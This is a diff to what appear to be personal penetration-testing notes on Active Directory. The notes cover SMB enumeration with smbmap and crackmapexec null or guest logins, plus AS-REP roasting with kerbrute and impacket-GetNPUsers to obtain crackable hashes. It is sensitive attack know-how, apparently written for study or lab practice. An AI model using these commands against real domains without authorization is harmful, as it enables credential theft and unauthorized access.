@@ -26,8 +26,10 @@
 3. `smbmap -H $IP` (anonymous login) 
 4. `smbmap -R $Filename $IP` (list the content of the directroy)
 5. `smbmap -R Filename $IP -A $FiletoDownload -q` (Download the intersting file such as Groups.xml)  `update db` and `locate $Filename`. 
-6. 'crackmapexec smb -u '' -p'' $IP` or 'crackmapexec smb -u 'guest' -p''`
+6. 'crackmapexec smb -u '' -p'' $IP` or `crackmapexec smb -u 'guest' -p''` to try to access.
 
 ## AS-REP Roasting (Authentication Reply Roasting)
-1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller, the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access.
-2. 
+1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller (AS-REQ), the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access. We can use krebrute, impacket, or crackmap
+2. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
+3. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME\`
+4. Crack the hash
